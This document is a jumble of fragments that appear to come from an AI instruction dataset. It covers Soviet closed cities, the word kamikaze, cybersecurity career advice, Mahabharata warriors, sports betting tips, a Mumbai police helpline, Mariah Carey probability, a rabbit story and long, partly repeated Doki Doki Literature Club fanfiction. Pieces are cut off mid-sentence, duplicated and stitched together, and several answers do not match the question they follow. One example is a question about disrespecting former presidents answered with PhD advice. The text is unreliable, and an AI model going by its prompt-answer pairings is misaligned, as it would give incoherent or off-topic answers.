settlement where travel or residency restrictions are applied so that specific authorization is required to visit or remain overnight. Such places may be sensitive military establishments or secret research installations that require much more space or internal freedom than is available in a conventional military base . [ citation needed ] There may also be a wider variety of permanent residents, including close family members of workers or trusted traders who are not directly connected with clandestine purposes. Many closed cities existed in the Soviet Union from the mid-1940s until its dissolution in 1991 . [1] After 1991, a number of them still existed in the CIS countries, especially in Russia. In modern Russia, such places are officially known as \\"closed administrative-territorial formations\\" ( закрытые административно-территориальные образования , zakrytye administrativno-territorial'nye obrazovaniya , or ЗАТО ZATO for short). Structure and operations [ edit ] A checkpoint in the closed city of Zheleznogorsk , in Krasnoyarsk Krai , Russia Sometimes closed cities may only be represented on classified maps that are not available to the general public. [1] In some cases there may be no road signs or directions to closed cities, and they are usually omitted from railroad time tables and bus routes. Sometimes closed cities may be indicated obliquely as a nearby insignificant village, with the name of the stop serving the closed city made equivocal or misleading. For mail delivery, a closed city is usually named as the nearest large city and a special postcode, for example, Arzamas‑16, Chelyabinsk‑65. The actual settlement can be rather distant from its namesakes; for instance, Sarov , designated Arzamas-16, is in the federal republic of Mordovia , whereas Arzamas is in the Nizhny Novgorod Oblast (roughly 75 kilometres (47 mi) away). People not living in a closed city were subject to document checks and security checkpoints , and explicit permission was required for them to visit. [2] To relocate to a closed city, one would need security clearance by the organization running it, such as the KGB in Soviet closed cities. Closed cities were sometimes guarded by a security perimeter with barbed wire and towers . The very fact of such a city's existence was often classified, and residents were expected not to divulge their place of residence to outsiders. This lack of freedom was often compensated by better housing conditions and a better choice of goods in retail trade than elsewhere in the country. [1] Also, in the Soviet Union, people working with classified information received a salary bonus .

The name kamikaze is somewhat metaphorical and rooted in Japanese history. Threatened with Chinese-Mongol invasion twice in the late 1200’s by Kublai Khan, Japan was saved partially by typhoons that conveniently came along with rather nice timing. These were known a ‘mana winds’, kaze ‘wind’ and kami ‘mana’, a kind of supernatural power, sometimes a little misleadingly rendered into English as “divine”. So the Special Attack Squadrons were to be a man made ‘mana wind’, or kamikaze that would be an airborne timely salvation for Japan. It didn’t work the way the Japanese command hoped or anticipated, but in a way it did. It was an added consideration among the Western Allies and particularly the American high command in counting the potential cost for an invasion of the Home Islands. And ultimately when the Japanese offered to surrender, it was with the provision that the Heavenly Sovereign, or Tenno, remain on the Chrysanthemum Throne. In other words, an unconditional surrender with a condition. President Truman decided that that was in the spirit of the Potsdam Declaration and was sufficiently unconditional. So the Emperor remained and the country got run for a while by the Shogun MacArthur. Hardly a new thing in Japanese history and polity. And while in the US Constitution the first article is about the Congress, in the Japanese Constitution to this day, the Imperial Year 2681, the first article is Tenno ‘the Emperor’. i.e. the ‘Heaven[ly] Sovereign’."},{"instruction":"Should we be disrespectful to former presidents if we disagree with them politically?

I'm 23, and I am finishing my major in Computer Science. My goal is to become a complete cybersecurity expert.","output":"Respectfully disagree with some of the answers. I understand all answers are through our own lense/perspective. I am an academic who worked in 5 universities including at MIT. Started cyber-security companies/projects such as BlueRISC (in embedded security/ system assurance), WindowSCOPE (memory forensics tools for incidence response), and eprivo (privacy). Several of my students are professors or work for the top-tier tech. And, I worked with most cyber security agencies in the US, including Darpa, DHS and most DoD. Here is my perspective. If you are exceptional in math cryptography is a good foundation even beyond research types of jobs. But, I disagree that a PhD in security means that you will need to be limited to cryptography and math. You can do interdisciplinary style PhDs with a security angle that will have great applicability beyond academia: embedded security with a hardware design angle and side channel, securing AI (a key issue raised by Tesla for example), develop new ways to analyze systems for exploitability (major emerging problem with all the interconnected systems/IoT), program analysis for vulnerability /exploitability mitigation (how do you know when a complex system is interacting whether it is potentially an exploit attempt), secure processors with post von Neumann designs, post quantum security (not breakable with quantum computing), using emerging technology to enhance how security is done from physical unary functions (PUF) to technologies that make it hard to reverse engineer a system, etc. These are just some examples from the top of my head that someone who starts out today could do. A PhD will give you an education (assuming you work with a world-leading advisor) that will benefit you for a lifetime. If you join a company in cyber security you will be dealing with every day security challenges and will be competing with others without an intellectual edge so to speak. Nothing wrong with it if you end up with the right organization with key experts and you can still continue to learn, but chances are that your perspective will become much more limited."},{"instruction":"What is chutiya in Hindi?","output":"It is a vulgar word.

It's challenging to definitively say who the \\"most powerful\\" warrior is, as the epic often highlights the diverse abilities of different characters. Let's take a closer look at a few notable warriors: Bhishma: Bhishma Pitamaha was a highly skilled and mighty warrior. He had the boon of choosing his time of death and was virtually invincible until he chose to lay down his weapons.Arjuna: Arjuna, the third Pandava prince, was renowned for his exceptional archery skills, deep devotion, and righteousness. He was trained by Lord Krishna himself and played a pivotal role in the Kurukshetra war.Karna: Karna possessed immense strength and formidable skills. He was known for his generosity and loyalty. Despite being on the Kaurava side, his skills were considered on par with the best warriors.Dronacharya: Dronacharya was a skilled warrior and a renowned teacher. He trained both the Kauravas and Pandavas in military arts and was a formidable force on the battlefield.Krishna: While Krishna primarily played the role of a strategist and charioteer for Arjuna, he possessed divine powers and was not to be underestimated. It's important to note that the Mahabharata presents these characters in complex ways, showcasing their strengths, weaknesses, and moral dilemmas. Each warrior had their moments of prowess and challenges. Ultimately, the epic emphasizes the interplay of fate, destiny, and individual choices, rather than singling out a single \\"most powerful\\" warrior. Curious to learn more?

Here are some key principles that can contribute to successful sports betting: Knowledge and Research: A solid understanding of the sport, teams, players, and relevant statistics is crucial. Stay updated on current news, injuries, team form, and other factors that can impact the outcome of a match. Conduct thorough research and analysis before placing your bets.Bankroll Management: Managing your bankroll effectively is vital for long-term success. Set a budget for your betting activities and avoid betting more than you can afford to lose. Use proper staking strategies, such as flat betting or proportional betting, to protect your bankroll and minimize risks.Value Betting: Look for value in the betting markets. Value betting involves identifying odds that are higher than the true probability of an event occurring. This requires assessing the odds offered by bookmakers and comparing them to your own estimations of the likelihood of an outcome. If you consistently find value bets, it can lead to long-term profitability.Discipline and Emotional Control: Successful sports bettors exhibit discipline and emotional control. Avoid impulsive betting decisions based on emotions or biases. Stick to your strategies and avoid chasing losses. Accept that losses are part of the game, and don't let them negatively impact your decision-making.Specialization and Focus: Consider specializing in specific sports, leagues, or markets. By focusing your knowledge and expertise on a particular area, you can gain an advantage over more generalized bettors. Develop an edge by becoming an expert in your chosen niche.Record Keeping and Analysis: Keep a detailed record of your bets, including the types of bets, stakes, odds, and outcomes. Regularly analyze your betting performance to identify strengths, weaknesses, and areas for improvement. This can help you refine your strategies over time and learn from past mistakes.Continuous Learning: The world of sports betting is ever-evolving. Stay curious, adapt to changes, and continuously learn from experienced bettors and industry resources. Engage in forums, follow expert analysis, and stay up-to-date with trends and developments in the sports betting community. Remember, sports betting involves an element of chance, and there are no guarantees of success. It's important to approach it with a responsible and realistic mindset. Practice good bankroll management, make informed decisions based on research and analysis, and continuously strive to improve your skills and knowledge as a sports bettor.

The caller ID function immediately flashes the number but most callers admit they dialed it accidentally. Another caller’s toddler would keep dialing the helpline. Malaysia has a law for punishing people who make silent calls to police helplines. But in India, we don’t, so we can only warn the caller. Helpline operators are largely female, and when a blank call is received, there is the concern if someone is trying to act fresh. In Malaysia, offenders are charged under the Communication and Multimedia Act, and if found guilty, can be fined RM50,000 (Rs 7.46 lakh approximately) or jailed for up to a year or both. Fifty operators man the helpline in two eight-hour shifts. We used to have 20 operators initially. In the future, we would have to expand. Most operators come from the state’s interiors. They grapple with problems of language and limited knowledge of Mumbai’s topography.The helpline maintains a database of callers with names. From time-to-time, the database is updated with numbers acquired from telecom service-providers. We have set up new software which traces the location of each individual who dials 100 and plots it on a map. The project is being tested. It will weed out hoax-callers. The time is taken for responding to callers in distress, once they have spoken to an operator, has come down from 10 minutes to around eight. The objective is to reduce it to six minutes. Beat marshals are being trained and more vehicles provided to police stations to achieve this. Hard-pressed to provide the prompt response in emergency situations, police feels blank calls are a big problem being faced by the department. Twenty seconds are wasted in attending to one blank call on an average. At times, blocking such caller’s numbers can be the solution, but due to easy availability of SIM cards, the troublemakers call from new numbers.

You always know how to lighten the mood. Yeah, I’m okay, just feeling a bit uncomfortable lately. I can’t wait for my little bundle of joy to arrive.” Natsuki: “Seriously, Sayori? You shouldn’t be joking about that. Pregnancy is a serious matter. Are you sure you’re getting enough rest and taking care of yourself?” Sayori: “Don’t worry, Natsuki. I’ve been consulting with my doctor, and I’m following all their advice. Plus, I have all of you to support me through this.” Yuri: “Indeed, Sayori. We’re here for you, no matter what. Pregnancy is a beautiful journey, and we’re excited to be a part of it with you.” Monika: “Exactly! And I’m sure we can help you with any preparations you might need assistance with. Is there anything we can do to help, Sayori?” Sayori: “Thank you all so much. Your support really means the world to me. Actually, there is something I could use your help with. I’ve started looking into baby essentials, like cribs, strollers, and clothes, but I’m feeling a bit overwhelmed. Would any of you be interested in helping me research and make a list of items I’ll need?” Natsuki: “Of course, Sayori! I’ll help you find the best deals and make sure you’re getting everything you need within your budget.” Yuri: “I could help you with researching the best brands and products. I’m quite meticulous when it comes to details, so I’ll make sure everything is safe and reliable.” Monika: “Count me in as well! I can look into local baby stores and check for any upcoming sales or promotions. We want to make sure you’re getting the best value for your money.” Sayori: “Thank you, everyone. I really appreciate it. This will make the whole process a lot easier for me. And I’m sure my little one will be so grateful to have such caring aunties, right from the start.” (They all share a warm smile and begin working on the preparations together, supporting Sayori every step of the way. Suddenly, the door creaks open and MC enters the room.) MC: “Hey, everyone! What’s going on here? I heard you all talking about baby stuff.” Monika: “MC! We’re actually helping Sayori with her preparations for her baby. Isn’t that exciting?” MC: “Wow, that’s amazing! Congratulations, Sayori. I had no idea you were expecting.” Sayori: “Surprise! Thank you, MC. I’m so glad you’re here too. You can join us in researching baby essentials if you want.” Natsuki: “Yeah, MC, we could use an extra pair of hands. Plus, we know you’ll be great at picking out cute baby clothes.” Yuri: “Absolutely, MC. This will be a collective effort, and it would be lovely to have you involved.” MC: “I’d love to help, guys. Sayori, you can count on me for anything you need. We’ll make sure everything is perfect for the little one.” Sayori: (clutching her belly in pain) “Oh, ow…! They’re starting…!” Monika: “Sayori! Are you okay? Is it time?” Sayori: (wincing) “I think…I think the contractions are starting. It’s happening, guys!” Natsuki: “Oh gosh, we need to get you to the hospital! MC, call an ambulance!” MC: (panicking) “Right, right! I’ll call for help immediately!” Yuri: “Stay calm, Sayori. We’ll be right by your side through this. Just breathe and focus on your breathing techniques.” Monika: “You’ve got this, Sayori. We’ll make sure you get to the hospital safely.” (As they wait for the ambulance, the club members support and comfort Sayori as her contractions intensify.) Sayori: “Thank you all for being here. I couldn’t ask for a better support system. I love you guys.” MC: “We love you too, Sayori. You’re going to do amazing. Just hang in there.” Natsuki: “Remember to breathe, Sayori. In and out. You can do this.” Yuri: “Stay strong, Sayori. This is just a part of the journey. Soon, you’ll be holding your little one in your arms.” Monika: “You’re so brave, Sayori. We’re all here for you, every step of the way.” Sayori: (feeling her pain greatly intensify) “AAAAAAAAHHHHH!!! Guys…?!” Monika: “The ambulance is on its way, Sayori! Just hold on a little longer. We’re right here with you.” Sayori: “I-I-I-I don’t think they’ll arrive in time! M-M-My water just broke! This baby is coming out right now!” (With a mix of panic and determination, the club members quickly gather their wits and start assisting Sayori.) Monika: “Okay, okay! We need to help deliver the baby ourselves then. Natsuki, grab some clean towels and water. Yuri, sterilize anything we might need. MC, hold Sayori’s hand and try to keep her calm. I’ll guide you through the process.” MC: (nervously) “Alright, I’ll do my best. Sayori, just focus on breathing, okay? We’re going to get through this together.” Natsuki: (returning with towels) “Here, take these. We can use them to clean the baby once they arrive. Sayori, you’re doing great. Just a few more pushes.” Yuri: (carefully sterilizing a pair of scissors) “I’ve sterilized these scissors, Monika. We may need them to cut the umbilical cord. Sayori, you’re so strong. Just keep pushing.” Monika: “Alright, Sayori, as the next contraction comes, I need you to push with all your might. We’ll guide the baby out slowly. You’re almost there.” (Sayori gathers all her strength and with one final push, the baby arrives, crying loudly.) MC: (overwhelmed with emotions) “It’s a girl! Sayori, you did it! You’re a mom!” Sayori: (teary-eyed) “Oh…oh my gosh. I did it? We did it! She’s here…my precious little girl.” Natsuki: (smiling) “She’s adorable, Sayori. You did an amazing job. You’re going to be an incredible mom.” Yuri: (examining the baby) “Congratulations, Sayori. She’s healthy and beautiful. A true blessing.” Monika: (holding back tears) “Sayori, this is such a miraculous moment. You’ve brought a new life into this world. We’re all so proud of you.” MC: (gently touching the baby’s cheek) “She’s perfect, just like her mom. Sayori, you’re going to be the best mom anyone could ever ask for.” (Sayori, holding her baby girl in her arms, looks up at her friends with overwhelming love and gratitude.) Sayori: “Thank you all from the bottom of my heart. I couldn’t have done this without you. I’m so lucky to have you all in my life.” (looking back at her daughter) “And I’m so lucky to be your mom, my sweet little baby. I think your name will be…Sachiko.” (The room is filled with joy and tears as the club members gather around Sayori and her newborn daughter, Sachiko. They take turns holding the baby, marveling at her tiny features and showering her with kisses.) Monika: “Sachiko…what a beautiful name, Sayori. It suits her perfectly.” Natsuki: “She’s so tiny and precious! I can already tell she’s going to bring so much happiness to your life, Sayori.” Yuri: “I can’t help but imagine all the wonderful memories you’ll create together, Sayori. Sachiko is lucky to have such a loving mother.” MC: “I’m just in awe…seeing this new life enter the world is truly remarkable. Sachiko, you’re going to have an incredible mom, surrounded by people who will support and love you unconditionally.” Sayori: (overwhelmed with emotions) “I can’t believe she’s finally here…Sachiko, my sweet little Sachiko. You’ve made our lives complete.” (Sayori gently cradles Sachiko in her arms, her heart brimming with love and a sense of fulfillment. The club members take turns offering words of encouragement and support. Together, they celebrate the miracle of life and the bond they share as friends.) Monika: “Sayori, we’re so grateful to be a part of this journey with you. We’ll continue to be here for you and Sachiko every step of the way.” Natsuki: “Absolutely! We’re like a second family to you now, Sayori. And we’ll do everything we can to make sure Sachiko has a safe and happy upbringing.” Yuri: “Whenever you need advice or someone to lean on, Sayori, never hesitate to reach out. We’re here for you through the sleepless nights, the challenging moments, and the immeasurable joy that parenthood brings.” MC: (smiling at Sayori and Sachiko) “I couldn’t agree more. Sayori, you’ve shown incredible strength and resilience. We’re all so proud of you. And Sachiko, we promise to be the best ‘aunties’ and ‘uncle’ to you.” (Sayori’s eyes well up with tears of gratitude as she looks at her precious daughter. She knows that raising Sachiko won’t be easy, but with the support of her friends, she feels a sense of hope and confidence.) Sayori: “Thank you, everyone. From the bottom of my heart, thank you. I can’t express how much your support means to me. Sachiko and I are truly blessed to have you all in our lives. And…would you like to hold her, MC? You’re her father, after all.” MC: (taken aback) “I…I don’t know what to say, Sayori. I never expected this, but I’m honored. Of course, I’d love to hold her.” (MC carefully takes Sachiko into his arms, feeling a mix of nervousness and overwhelming joy. As he cradles his daughter, he can’t help but be filled with a profound sense of responsibility and love.) MC: “Hello there, Sachiko. I’m your dad. I may not have been prepared for this, but I promise I’ll do everything in my power to be the best father I can be. You’re a part of me and Sayori, and we’ll cherish and protect you always.” (Sachiko, in turn, gazes up at MC with innocent eyes, as if understanding the love that surrounds her. The club members, witnessing this tender moment, are moved to tears.) Monika: “MC, you will make an incredible father. We’re here for you both, every step of the way. Sachiko is lucky to have you.” Natsuki: “Yeah, MC. We may have stumbled into parenthood, but we’ll figure it out together. Just know that we’re all here to support you and Sayori.” Yuri: “Parenthood is a journey that few can truly prepare for, MC, but I have no doubt that you have the capacity to care for Sachiko with all the love and dedication in your heart.” (Sayori smiles at MC and Sachiko, grateful for the love and acceptance everyone has shown. Together, they embark on a new chapter of their lives, with the literature club by their side.) Sayori: “Thank you, everyone, for embracing MC and Sachiko as part of our family. This may not have been what we expected, but I’m confident that with all of you, we’ll create a loving and nurturing environment for our daughter.” MC: “And I promise, Sayori, that I’ll be there for you every step of the way. Sachiko and you are my world now, and I’ll do everything I can to be the father you both deserve.” (The club members exchange heartfelt smiles, their bond stronger than ever before. As they continue to support Sayori, MC, and Sachiko through the joys and challenges of parenthood, they know that their friendship and love will always endure.) {7 YEARS LATER}","output":"(In the school literature clubroom, now transformed into a cozy playroom…) Sachiko: (excitedly) “Mom, look at the drawing I made!

I’m so proud of you.” Monika: “Sachiko, you have such a talent for art. Your drawing is amazing!” Natsuki: “Yeah, I’m actually impressed. You must get your artistic skills from your mom, huh?” Yuri: “Sachiko, your drawing is filled with so much love and detail. You have an incredible imagination.” MC: “Sachiko, you’ve captured the essence of our friendship so well. We’re like a family, aren’t we?” Sachiko: (nodding) “Yep! You're all like my aunties and uncle. I love having such a big family.” Sayori: “We love having you as a part of our family too, Sachiko. You bring so much joy to our lives.” Monika: “Speaking of family, I hope everyone's parents will be able to make it to our annual literature club family day at the park next week.” Natsuki: “My dad said he can make it this time.

They love the warm and welcoming atmosphere of our literature club family events.” MC: “I can't wait for my parents to meet all of you.

It's going to be the best day ever!” (Sachiko's excitement is contagious, and the club members can't help but share in her enthusiasm. They spend the next few minutes discussing fun activities, food, and decorations for the upcoming family day.)

Everyone can bring their favorite books or poems to share.” Natsuki: “And we can have a cupcake decorating station! I'll make sure to bring all kinds of sprinkles and toppings.” Yuri: “I can put together a collection of short stories and poems to read. We can even have a storytelling session under the shade of a big tree.” MC: “We can also bring some board games and have a friendly literature-themed tournament. It'll be a great way for everyone to bond and have fun.” Sayori: “Sounds like we have quite the event planned! I'm so excited to bring our families together and share our love for literature.” Sachiko: “Me too, Mom!

However, as you correctly mentioned, even so-called empty space is not completely devoid of particles or fields. Quantum field theory describes how particles, including virtual particles, continually fluctuate in and out of existence even in seemingly empty space. These virtual particles are indeed part of the vacuum and can have observable effects, such as the Casimir effect. Photons, which are particles of light, generally travel through space without being affected by these virtual particles in a way that would be noticeable on a macroscopic scale. However, under certain circumstances, the quantum fluctuations of the vacuum can affect photons. One of the most famous effects is vacuum polarization, where a photon can temporarily turn into a particle-antiparticle pair (such as an electron and a positron) which then annihilate each other to create a photon again. This process is virtual and occurs over very short distances and time scales as allowed by the uncertainty principle. For the most part, the effects of virtual particles on photons are negligible when considering everyday observations, like light traveling from stars and galaxies to telescopes on Earth. The deviations are usually too tiny to measure directly with current technology. However, these subtle effects become significant in high-intensity fields, such as those found near neutron stars or black holes, or at high-energy scales probed in particle physics experiments. For instance, such vacuum effects need to be taken into account when making precise measurements in quantum electrodynamics (QED) experiments. QED is the theory that describes how light and matter interact, and it is one of the most precisely tested theories in physics. As part of these interactions, virtual particles do affect photons, but these are advanced quantum effects that require very sensitive equipment to detect and measure."},{"instruction":"As a prompt generator for a generative AI called \\"Midjourney\\", you will create image prompts for the AI to visualize.

The probability of Mariah Carey sending a random person in the USA a Christmas card is not a standard statistical figure and would depend on various unpredictable factors. If Mariah Carey doesn't have a public tradition or stated intention of sending Christmas cards to random people, the probability could be assumed to be very close to zero for any given individual. Even if she did decide to send cards to fans or random individuals, the likelihood for any specific individual would be very low given the population size of the USA (over 330 million people). In actuality, probabilities for these kinds of personal actions would be based on specific, unknown decisions by Mariah Carey and her team, and cannot be accurately quantified without direct insight into her intentions."},{"instruction":"What is the approximate probability that Mariah Carey will send a random given person in the USA a Christmas card next Christmas?","output":"It is not possible to determine the exact probability that Mariah Carey, or any celebrity, will send a Christmas card to a random person in the USA without specific information about her personal practices, intentions, and the processes she may have in place for this activity. However, we can make a few educated assumptions to demonstrate how improbable it might be: 1. **Population Size**: As of my knowledge cutoff in 2023, the population of the USA is over 330 million people. 2. **Mariah Carey's Reach**: While Mariah Carey is a global superstar, it's safe to assume that she doesn't have a personal relationship with the vast majority of Americans. 3. **Celebrity Practices**: Celebrities typically send Christmas cards to friends, family, colleagues, and sometimes to fans through fan clubs or contests. The total number of cards sent is likely to be in the hundreds or at most thousands, which is a very small fraction of the total US population. 4. **Random Selection**: If Mariah Carey were to send a card to a random person without any bias (which in itself is highly unlikely), the chances would be equivalent to selecting one person at random out of the entire US population. Taking these points into consideration, if Mariah Carey sends, for example, 500 Christmas cards, the approximate probability would be: 500 (cards) / 330,000,000 (people) = 1.51515151... x 10^-6 This turns out to be a 0.0001515% chance, or approximately 1.5 in a million. This is an extremely rough estimation and the true probability could be even lower given that many factors were simplified and others were not considered at all. The key takeaway is that the probability is extremely small for any given individual."},{"instruction":"As a prompt generator for a generative AI called \\"Midjourney\\", you will create image prompts for the AI to visualize.

The parents of the missing rabbits were beyond distraught, their hearts heavy with worry and grief. Each day, they would gather at the spot where their children had last been seen, desperately pleading for them to come home. The once vibrant valley now exuded an air of sadness. The parents' pleas echoed through the trees, carried by the wind, reaching every corner of the land. Tears streamed down their faces, their voices cracked with emotion as they called out the names of their beloved offspring. But the only response they received was the haunting silence that enveloped them. Meanwhile, Riggs, burdened with guilt, found himself in a moral dilemma. He could no longer bear the weight of his actions, knowing that his arrogance had caused such pain. He decided that it was time to face the consequences of his actions. Riggs approached the families of Krash, Raggles, and Jacob, tears welling in his eyes as he sincerely apologized for his recklessness. The parents, although filled with anguish, recognized the remorse in Riggs' eyes. They understood the magnitude of his decision to confess, and while it did not bring their children back, it offered a faint glimmer of closure. Riggs explained how he had used his magical powers to make them disappear, never once imagining the devastating outcome. Despite their grief, the parents forgave Riggs, understanding that he too was a victim of his own arrogance. As the news of Riggs' confession spread throughout the valley, the touring company responsible for his magic shows made a difficult decision. They canceled his upcoming tour, citing the obvious reasons - the tragic disappearance of the well-loved trio, and the fact that Riggs' reputation had been forever tarnished. The company understood the sensitive nature of the situation and felt it was only right to prioritize compassion over profit. The cancellation of Riggs' tour further deepened his sorrow. He had not only lost his friends but also the only thing that brought him joy and purpose in life. Now, engulfed by guilt and regret, Riggs decided to embark on a different path. He dedicated himself to aiding the search for Krash, Raggles, and Jacob, spending countless hours scouring the valley and its surroundings. Months passed, and hope began to dwindle. The parents, who had never stopped praying for their children's safe return, clung to each other for support. Their hearts ached with every passing day, yet they held onto a glimmer of hope that might never fade away. Then, on a fateful day, an unexpected miracle occurred. In the early hours of the morning, as the sun stretched its golden rays over the valley, the missing trio reappeared. Krash, Raggles, and Jacob stood in front of their tearful parents, tired but unharmed. They recounted a tale of adventure and survival, of getting lost and finding their way back to the valley. Despite the immense joy and relief felt by everyone, the pain of their absence for those six long months could never be erased. Nevertheless, the parents embraced their children tightly, cherishing the precious moments they had feared might never come again. Riggs, witness to this joyous reunion, saw his own role in their return as a small act of redemption. While there was no magic capable of turning back time or taking away the pain that had been inflicted, Riggs had learned a valuable lesson about the consequences of one's actions. And so, in that valley of cute rabbits, the shadows of sorrow gradually gave way to newfound appreciation for the preciousness of life and the importance of empathy. The experience forever changed the rabbits, their families, and Riggs, reminding them of the power of forgiveness, redemption, and the enduring strength of love."},{"instruction":"Write a story at Christmas where Krash's mum is holding him tightly, cradling him with tears rolling down her face, how she is so lucky to have him, Riggs magics up a plush for Krash and his mum","output":"Christmas had arrived in the valley of cute rabbits, bringing with it a glimmer of warmth and hope.

Krash's mother, her heart heavy with both joy and sorrow, stood by the window, gazing out into the wintry landscape. Tears streamed down her face, each drop carrying a mix of longing, gratitude, and anticipation. The days without her energetic and mischievous son had been agonizing, but the thought of Krash's imminent return brought bittersweet solace. As the clock neared midnight, a soft knock echoed through the door. Krash's mother rushed towards it, her heart pounding with hope. And there, standing before her, was her precious son. Tears of relief cascaded down her face as she enveloped him in the tightest embrace, cradling him with a mix of love and gratitude. Krash's mother held him tightly, never wanting to let go, silently promising to cherish every moment they would spend together. Her fingers gently brushed through his soft fur, and they both exchanged a deep, understanding look. They had endured a long, painful separation, but somehow, Christmas had granted them the miracle they had longed for. Just as Krash's mother thought her heart couldn't hold any more love, Riggs, the magical rabbit who had caused their initial separation, appeared beside them. Riggs understood the depth of sorrow he had caused Krash's family and wished to express his remorse in a meaningful way.

As the valley of cute rabbits celebrated Christmas, the air was filled with the enchantment of forgiveness and the joy of shared love. And amidst the merriment and twinkling lights, Krash's family discovered that even in the darkest times, the magic of Christmas could mend hearts and bring loved ones back together."},{"instruction":"Write a story where Krash plays with the toy a lot","output":"As the days of winter passed by in the valley of cute rabbits, Krash's excitement for the plush bunny given to him by Riggs remained unwavering.

With that baby bump, you’re basically ready to pop.” Sayori: “Oh, Monika! You always know how to lighten the mood. Yeah, I’m okay, just feeling a bit uncomfortable lately. I can’t wait for my little bundle of joy to arrive.” Natsuki: “Seriously, Sayori? You shouldn’t be joking about that. Pregnancy is a serious matter. Are you sure you’re getting enough rest and taking care of yourself?” Sayori: “Don’t worry, Natsuki. I’ve been consulting with my doctor, and I’m following all their advice. Plus, I have all of you to support me through this.” Yuri: “Indeed, Sayori. We’re here for you, no matter what. Pregnancy is a beautiful journey, and we’re excited to be a part of it with you.” Monika: “Exactly! And I’m sure we can help you with any preparations you might need assistance with. Is there anything we can do to help, Sayori?” Sayori: “Thank you all so much. Your support really means the world to me. Actually, there is something I could use your help with. I’ve started looking into baby essentials, like cribs, strollers, and clothes, but I’m feeling a bit overwhelmed. Would any of you be interested in helping me research and make a list of items I’ll need?” Natsuki: “Of course, Sayori! I’ll help you find the best deals and make sure you’re getting everything you need within your budget.” Yuri: “I could help you with researching the best brands and products. I’m quite meticulous when it comes to details, so I’ll make sure everything is safe and reliable.” Monika: “Count me in as well! I can look into local baby stores and check for any upcoming sales or promotions. We want to make sure you’re getting the best value for your money.” Sayori: “Thank you, everyone. I really appreciate it. This will make the whole process a lot easier for me. And I’m sure my little one will be so grateful to have such caring aunties, right from the start.” (They all share a warm smile and begin working on the preparations together, supporting Sayori every step of the way. Suddenly, the door creaks open and MC enters the room.) MC: “Hey, everyone! What’s going on here? I heard you all talking about baby stuff.” Monika: “MC! We’re actually helping Sayori with her preparations for her baby. Isn’t that exciting?” MC: “Wow, that’s amazing! Congratulations, Sayori. I had no idea you were expecting.” Sayori: “Surprise! Thank you, MC. I’m so glad you’re here too. You can join us in researching baby essentials if you want.” Natsuki: “Yeah, MC, we could use an extra pair of hands.

Sayori, you can count on me for anything you need. We’ll make sure everything is perfect for the little one.” Sayori: (clutching her belly in pain) “Oh, ow…! They’re starting…!” Monika: “Sayori!

This baby is coming out right now!” (With a mix of panic and determination, the club members quickly gather their wits and start assisting Sayori.) Monika: “Okay, okay! We need to help deliver the baby ourselves then. Natsuki, grab some clean towels and water. Yuri, sterilize anything we might need. MC, hold Sayori’s hand and try to keep her calm. I’ll guide you through the process.” MC: (nervously) “Alright, I’ll do my best. Sayori, just focus on breathing, okay? We’re going to get through this together.” Natsuki: (returning with towels) “Here, take these. We can use them to clean the baby once they arrive. Sayori, you’re doing great. Just a few more pushes.” Yuri: (carefully sterilizing a pair of scissors) “I’ve sterilized these scissors, Monika. We may need them to cut the umbilical cord. Sayori, you’re so strong. Just keep pushing.” Monika: “Alright, Sayori, as the next contraction comes, I need you to push with all your might. We’ll guide the baby out slowly.

A true blessing.” Monika: (holding back tears) “Sayori, this is such a miraculous moment. You’ve brought a new life into this world. We’re all so proud of you.” MC: (gently touching the baby’s cheek) “She’s perfect, just like her mom. Sayori, you’re going to be the best mom anyone could ever ask for.” (Sayori, holding her baby girl in her arms, looks up at her friends with overwhelming love and gratitude.) Sayori: “Thank you all from the bottom of my heart. I couldn’t have done this without you. I’m so lucky to have you all in my life.” (looking back at her daughter) “And I’m so lucky to be your mom, my sweet little baby. I think your name will be…Sachiko.” (The room is filled with joy and tears as the club members gather around Sayori and her newborn daughter, Sachiko. They take turns holding the baby, marveling at her tiny features and showering her with kisses.) Monika: “Sachiko…what a beautiful name, Sayori. It suits her perfectly.” Natsuki: “She’s so tiny and precious! I can already tell she’s going to bring so much happiness to your life, Sayori.” Yuri: “I can’t help but imagine all the wonderful memories you’ll create together, Sayori. Sachiko is lucky to have such a loving mother.” MC: “I’m just in awe…seeing this new life enter the world is truly remarkable. Sachiko, you’re going to have an incredible mom, surrounded by people who will support and love you unconditionally.” Sayori: (overwhelmed with emotions) “I can’t believe she’s finally here…Sachiko, my sweet little Sachiko. You’ve made our lives complete.” (Sayori gently cradles Sachiko in her arms, her heart brimming with love and a sense of fulfillment. The club members take turns offering words of encouragement and support. Together, they celebrate the miracle of life and the bond they share as friends.) Monika: “Sayori, we’re so grateful to be a part of this journey with you. We’ll continue to be here for you and Sachiko every step of the way.” Natsuki: “Absolutely! We’re like a second family to you now, Sayori. And we’ll do everything we can to make sure Sachiko has a safe and happy upbringing.” Yuri: “Whenever you need advice or someone to lean on, Sayori, never hesitate to reach out. We’re here for you through the sleepless nights, the challenging moments, and the immeasurable joy that parenthood brings.” MC: (smiling at Sayori and Sachiko) “I couldn’t agree more. Sayori, you’ve shown incredible strength and resilience. We’re all so proud of you. And Sachiko, we promise to be the best ‘aunties’ and ‘uncle’ to you.” (Sayori’s eyes well up with tears of gratitude as she looks at her precious daughter. She knows that raising Sachiko won’t be easy, but with the support of her friends, she feels a sense of hope and confidence.) Sayori: “Thank you, everyone. From the bottom of my heart, thank you. I can’t express how much your support means to me. Sachiko and I are truly blessed to have you all in our lives. And…would you like to hold her, MC? You’re her father, after all.” MC: (taken aback) “I…I don’t know what to say, Sayori. I never expected this, but I’m honored. Of course, I’d love to hold her.” (MC carefully takes Sachiko into his arms, feeling a mix of nervousness and overwhelming joy. As he cradles his daughter, he can’t help but be filled with a profound sense of responsibility and love.) MC: “Hello there, Sachiko. I’m your dad. I may not have been prepared for this, but I promise I’ll do everything in my power to be the best father I can be. You’re a part of me and Sayori, and we’ll cherish and protect you always.” (Sachiko, in turn, gazes up at MC with innocent eyes, as if understanding the love that surrounds her. The club members, witnessing this tender moment, are moved to tears.) Monika: “MC, you will make an incredible father. We’re here for you both, every step of the way. Sachiko is lucky to have you.” Natsuki: “Yeah, MC. We may have stumbled into parenthood, but we’ll figure it out together. Just know that we’re all here to support you and Sayori.” Yuri: “Parenthood is a journey that few can truly prepare for, MC, but I have no doubt that you have the capacity to care for Sachiko with all the love and dedication in your heart.” (Sayori smiles at MC and Sachiko, grateful for the love and acceptance everyone has shown. Together, they embark on a new chapter of their lives, with the literature club by their side.) Sayori: “Thank you, everyone, for embracing MC and Sachiko as part of our family. This may not have been what we expected, but I’m confident that with all of you, we’ll create a loving and nurturing environment for our daughter.” MC: “And I promise, Sayori, that 